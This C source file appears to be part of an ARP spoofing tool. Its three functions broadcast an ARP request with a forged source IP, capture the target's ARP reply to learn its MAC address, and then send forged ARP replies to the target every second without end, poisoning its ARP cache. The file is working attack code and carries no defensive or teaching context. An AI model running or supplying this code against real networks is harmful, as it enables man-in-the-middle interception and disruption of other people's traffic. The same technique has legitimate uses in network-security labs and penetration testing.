#include "ARP_Spoofer.h"

void 
broadcast_spoofed_ip(MAC my_mac, IP spoofed_ip, IP target_ip, struct sockaddr_ll* sending_if, int sock_fd)
{
    struct arppkt* pkt = make_arp_pkt(my_mac, spoofed_ip, BROADCAST, target_ip, ARPOP_REQUEST);
    __CheckNull(pkt);

    struct ethfrm* frm = make_eth_arp_frm(my_mac, BROADCAST, pkt);
    __CheckNull(frm);

    __CheckErr((sendto(sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) sending_if, sizeof(*sending_if)) < 0) ,
        "Sending Spoofed IP To Broadcast Failed\n");
    
    free(frm);
    free(pkt);
}

void
get_target_mac(int sock_fd, IP target_ip, MAC target_mac)
{
    uint8_t buffer[ETHER_MAX_LEN];

    while(1)
    {
        __CheckErr((recv(sock_fd, buffer, ETHER_MAX_LEN, 0)) < 0,
            "Receiving for getting target mac failed\n");

        struct ethfrm* eth = (struct ethfrm*) buffer;

        if(eth->eth_hdr.h_proto != htons(ETH_P_ARP) 
            || eth->eth_pld.arp_hdr.ar_op != htons(ARPOP_REPLY)
            || memcmp(&eth->eth_pld.arp_pld.SPA, target_ip, sizeof(IP)))
            continue;
        
        memcpy(target_mac, eth->eth_pld.arp_pld.SHA, sizeof(MAC));
        break;
    }
}

void
send_spoofed_ip(MAC my_mac, IP spoofed_ip, MAC target_mac, IP target_ip, struct sockaddr_ll* sending_if, int sock_fd)
{
    struct arppkt* pkt = make_arp_pkt(my_mac, spoofed_ip, target_mac, target_ip, ARPOP_REPLY);
    __CheckNull(pkt);

    struct ethfrm* frm = make_eth_arp_frm(my_mac, target_mac, pkt);
    __CheckNull(frm);

    while(1)
    {
        __CheckErr(sendto(sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) sending_if, sizeof(*sending_if)) < 0,
            "Sending Spoofed IP To Target Failed\n");

        sleep(1);
    }

    free(pkt);
    free(frm);
}

